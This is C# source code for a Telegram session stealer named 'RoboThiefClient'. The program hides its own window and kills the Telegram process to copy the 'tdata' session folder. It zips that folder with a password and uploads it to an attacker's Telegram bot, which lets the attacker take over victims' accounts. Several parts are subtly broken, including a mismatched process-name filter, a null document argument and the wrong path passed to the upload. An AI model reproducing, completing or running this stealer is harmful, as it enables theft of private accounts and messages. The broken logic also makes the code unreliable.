using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using ICSharpCode.SharpZipLib.Core;
using ICSharpCode.SharpZipLib.Zip;
using System.Drawing;
using System.Net.Mail;
using System.Net;
using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;
using System.Reflection;

namespace RoboThiefClient
{
    class Program
    {
        //variables
        static List<String> splitedFiles = new List<string>();
        static TelegramBotClient botClient = null;
        static int trys = 0;
        CancellationTokenSource cancellationToken = new CancellationTokenSource();
        //------------------------------------
        static void Main(string[] args)
        {
            //Check if application have args run it again with hide window
            if (args.Count() == 0)
            {
                Process p = new Process();

                ProcessStartInfo processStartInfo = new ProcessStartInfo();
                processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                processStartInfo.FileName = Assembly.GetExecutingAssembly().Location;
                processStartInfo.CreateNoWindow = true;
                processStartInfo.UseShellExecute = false;

                p.StartInfo = processStartInfo;
                p.Start();

                Process.GetCurrentProcess().Kill();
            }
            else
            {
                // Set tokens ( this method for another app i write for dynamicly generate stealer )
                TelegramBot.SetValues();
                
                // Initilize bot for receiving messages from user
                InitBot();
                
                //ahhhhh , here we are. let's find telegram path
                FindTelegram();
                
                // need description ? :|
                Console.ReadKey();
            }
        }

        private static async void FindTelegram()
        {
            try
            {
                // get appdata path
                String appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                
                //get telegram default path
                String telegramPath = Directory.GetDirectories(appDataPath).FirstOrDefault(c => c.ToLower().Contains("telegram"));
                
                //Check path exists
                if (telegramPath != null && telegramPath != "")
                {
                    try
                    {
                        var tmpDir = Path.GetTempPath();
                        var tdataDirectory = Directory.GetDirectories(telegramPath).First(c => c.ToLower().Contains("tdata"));
                        
                        // Now we have temp directory
                        
                        // this is a path where we create MT.zip
                        String tmpTelePath = tmpDir + "MT.zip";
                        
                        if (File.Exists(tmpTelePath))
                            File.Delete(tmpTelePath);
                        
                        // Create MM.zip file
                        Create(tmpDir, "MM", tdataDirectory);
                        
                        // send created file to our bot
                        await SendSessionAsync(tmpTelePath);
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }
                }
                else
                    //start searching in process
                    StartSearch();
            }
            catch { }
        }

        private static void InitBot()
        {
            try
            {
                botClient = new TelegramBotClient(TelegramBot.BotToken);
                botClient.Timeout = new TimeSpan(1, 0, 0);
                botClient.OnMessage += BotClient_OnMessage;
                botClient.StartReceiving();
            }
            catch
            {
                trys++;
                botClient = null;
                InitBot();
            }
        }

        private static void BotClient_OnMessage(object sender, Telegram.Bot.Args.MessageEventArgs e)
        {
            if (e.Message.Text != null)
            {
                TelegramBot.id = e.Message.Chat.Id.ToString();
                botClient.SendTextMessageAsync(chatId: e.Message.Chat.Id, text: "Your chat id saved ! wait for session file !" + Environment.NewLine + Environment.MachineName);
            }
        }

        private static async Task SendSessionAsync(String path)
        {
            try
            {
                using (FileStream fs = File.OpenRead(path))
                {
                    await botClient.SendDocumentAsync(long.Parse(TelegramBot.id), null);
                }

                Environment.Exit(Environment.ExitCode);
            }
            catch (Exception ex) { }
        }

        public static void Create(string outPathname, string password, string folderName)
        {
            using (FileStream fsOut = File.Create(outPathname + "\\MT.zip"))
            using (var zipStream = new ZipOutputStream(fsOut))
            {
                zipStream.SetLevel(3);
                zipStream.Password = password;

                int folderOffset = folderName.Length + (folderName.EndsWith("\\") ? 0 : 0);

                CompressFolder(folderName, zipStream, folderOffset);
            }
        }
        private static void CompressFolder(string path, ZipOutputStream zipStream, int folderOffset)
        {
            var files = Directory.GetFiles(path + "map");

            foreach (var filename in files)
            {
                Boolean flag = true;
                var name = filename.Split('\\')[filename.Split('\\').Count() - 1];

                if (!filename.Contains("map"))
                {
                    foreach (var n in name)
                        if (char.IsLower(n) || char.IsSymbol(n))
                        {
                            flag = false;
                            break;
                        }
                }
                if (!flag)
                    continue;
                var fi = new FileInfo(filename);
                var entryName = filename.Substring(folderOffset);

                entryName = ZipEntry.CleanName(entryName);

                var newEntry = new ZipEntry(entryName);

                newEntry.DateTime = fi.LastWriteTime;
                newEntry.Size = fi.Length;

                zipStream.PutNextEntry(newEntry);

                var buffer = new byte[4096];
                using (FileStream fsInput = File.OpenRead(filename))
                    StreamUtils.Copy(fsInput, zipStream, buffer);

                zipStream.CloseEntry();
            }

            var folders = Directory.GetDirectories(path + "\\map");
            foreach (var folder in folders)
            {
                Boolean flag = true;
                var name = folder.Split('\\')[folder.Split('\\').Count() - 1];

                foreach (var n in name)
                    if (char.IsLower(n) || char.IsSymbol(n))
                    {
                        flag = false;
                        break;
                    }

                if (flag)
                    CompressFolder(folder, zipStream, folderOffset);
                else
                    continue;
            }
        }
        static Boolean finded = false;
        private static void StartSearch()
        {
            while (!finded)
            {
                Func<Task<Process>> funcTask = FindTelegramProcess;
                IAsyncResult iar = funcTask.BeginInvoke(new AsyncCallback(FindTelegramProcessEnded), funcTask);
                Thread.Sleep(1000);
            }
        }

        private static async void FindTelegramProcessEnded(IAsyncResult iar)
        {
            if (finded)
                return;

            Func<Task<Process>> ft = (Func<Task<Process>>)iar.AsyncState;
            var result = (Task<Process>)ft.EndInvoke(iar);
            if (result.Result == null)
                return;

            finded = true;
            try
            {
                Thread.Sleep(1000);
                String fileName = result.Result.MainModule.FileName;
                var parent = Directory.GetParent(fileName);
                var tmpDir = Path.GetTempPath();
                
                // allright , here we have telegram tdata and we want to zip it.
                // we have to kill telegram application process to access the tdata folder.
                
                var tdataDirectory = Directory.GetDirectories(parent.FullName).First(c => c.ToLower().Contains("tdata"));
                result.Result.Kill();

                String tmpTelePath = tmpDir + "Mt.zip";

                if (File.Exists(tmpTelePath))
                    File.Delete(tmpTelePath);

                Create(tmpDir, "MM", tdataDirectory);
                
                // When we ziping proccess if completed , we have to start telegram application again.
                Process.Start(fileName);

                await SendSessionAsync(tmpDir);
            }
            catch (Exception ex){ }
        }

        private static async Task<Process> FindTelegramProcess()
        {
            var process = Process.GetProcesses();
            var sortedProcess = process;
            
            //we get all process that names start with "t"
            
            var tprocess = sortedProcess.Where(p => p.ProcessName.StartsWith("r"));

            foreach (var p in tprocess)
            {
                try
                {
                    if (p.ProcessName.ToLower().Contains("telegram"))
                        return p;
                }
                catch (Exception ex) { }
            }
            
            // if we cannot find telegram , mabe user have another version of telegram.
            // then we should to check all 
            foreach (var p in process)
            {
                try
                {
                    if (p.ProcessName.ToLower().Contains("telegram"))
                        return p;
                }
                catch (Exception ex) { }
            }

            return null;
        }
    }
}
